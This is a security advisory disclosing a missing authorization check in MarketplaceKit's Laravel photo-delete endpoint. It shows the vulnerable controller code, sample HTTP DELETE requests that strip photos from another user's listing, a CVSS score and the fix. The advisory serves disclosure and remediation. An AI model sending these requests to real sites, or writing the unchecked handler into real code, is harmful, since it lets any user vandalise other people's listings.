# MarketplaceKit Missing Authorization (Laravel 5.6)

**CWE-862 · Authenticated (any verified, non-admin user) missing authorization · delete photos from any listing on the site**

> **Vendor:** marketplacekit (https://github.com/marketplacekit)
> **Product:** MarketplaceKit (Laravel 5.6)
> **Affected version:** master @ 534aa0eb9981a42115bb139f79ae5433b4483a05 (last commit 2019-10-22); no official release version
> **Affected endpoints:** `DELETE /create/{listing}/image/{uuid?}` (route `create.delete-image`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** All account names, listing identifiers and image names in the examples are test values from an isolated local environment.

## 1. Summary

`CreateController@deleteUpload` removes a photo index from a listing's `photos` attribute and saves it without any authorization check — unlike every other write action in the same controller, which calls `$this->authorize('update', $listing)`. Any registered, email-verified user can therefore delete photos from any other user's listing, using the listing's publicly visible Hashids token and a numeric array index. Verified end-to-end: three unauthenticated-ownership DELETE requests took a victim listing from 3 photos to none.

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `app/Http/Controllers/CreateController.php` | 572-579 | `deleteUpload()`: unsets `photos[$uuid]` and saves — **no** `authorize()` call, no ownership check |
| `app/Http/Controllers/CreateController.php` | 187, 267, 622, 654 | Sibling write actions (`store`, `update`, `getTimes`, `postTimes`) all call `$this->authorize('update', $listing)` |
| `routes/web.php` | 109 | `Route::delete('/create/{listing}/image/{uuid?}', 'CreateController@deleteUpload')` inside the `auth`+`isVerified` group (line 92) |
| `app/Providers/RouteServiceProvider.php` | 36-39 | `{listing}` is a Hashids token of the sequential id — attacker-visible in public listing URLs |

```php
// app/Http/Controllers/CreateController.php:572-579
public function deleteUpload($listing, $uuid, Request $request) {
    $photos = (array) $listing->photos;
    unset($photos[$uuid]);
    $listing->photos = $photos;
    $listing->save();
    return ['success' => true];
}
```

## 3. Prerequisites

- Any registered, email-verified account (`auth` + `isVerified` middleware). No administrator privilege, no ownership.
- `{listing}`: the Hashids token of the target listing — printed in the public listing URLs (`/{listing}/{slug}/...` binds through the same Hashids decode), so it is harvested from any public page, not guessed.
- `{uuid}`: the numeric array key of the `photos` attribute (0..n).
- A standard web CSRF token, which every verified user session obtains from any page.

## 4. Reproduction

Victim's listing (owned by user 1) holds `photos = ["img0.png","img1.png","img2.png"]`. From the attacker's independent verified session:

```http
DELETE /create/<victim-listing-hashid>/image/0 HTTP/1.1
Host: target
Cookie: <attacker session>
X-CSRF-TOKEN: <attacker csrf token>

-> HTTP 200 {"success":true}    photos: {"1":"img1.png","2":"img2.png"}

DELETE /create/<victim-listing-hashid>/image/1 ... -> 200 {"success":true}   photos: {"2":"img2.png"}
DELETE /create/<victim-listing-hashid>/image/2 ... -> 200 {"success":true}   photos: []
```

The attacker fully stripped the victim-owned listing; the victim's edit page and public page no longer show any photo (storage files remain, references are gone).

## 5. Confirmed Techniques

Verified end-to-end on a default local install (Laravel 5.6, PHP 7.4.33, MySQL; two separate verified accounts):

| Request (attacker session) | Response | Victim `photos` after |
|---|---|---|
| `DELETE /create/Q81KoWKz3V/image/0` | 200 `{"success":true}` | `{"1":"img1.png","2":"img2.png"}` |
| `DELETE /create/Q81KoWKz3V/image/1` | 200 `{"success":true}` | `{"2":"img2.png"}` |
| `DELETE /create/Q81KoWKz3V/image/2` | 200 `{"success":true}` | `[]` |

(`Q81KoWKz3V` is the Hashids token of listing id 1 encoded with the test instance's app config; tokens are generated per-instance and read from public URLs.)

Controls: an authenticated DELETE without the CSRF token → 419; an unauthenticated DELETE → 419 (the `auth`+`isVerified` group blocks guests; a valid verified session always holds a CSRF token, so this is not an obstacle).

## 6. Impact

Unauthorized modification of any listing's media, site-wide (integrity): a competitor or vandal can systematically strip product images from arbitrary listings — each request needs only the publicly visible listing token and an array index. No confidentiality impact (no data is read) and no persistent availability loss (storage files remain and photos can be re-uploaded).

## 7. CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` (Base 6.5 - Medium)

## 8. Remediation

- Add `$this->authorize('update', $listing)` as the first statement of `CreateController@deleteUpload`, matching every other write action in the controller (lines 187, 267, 622, 654).
- Alternatively/additionally enforce an explicit ownership check (`$listing->user_id === auth()->id()`) and return 403 otherwise.

## 9. References

- Project: https://github.com/marketplacekit/marketplacekit
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- External disclosure: [GIST_URL]
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
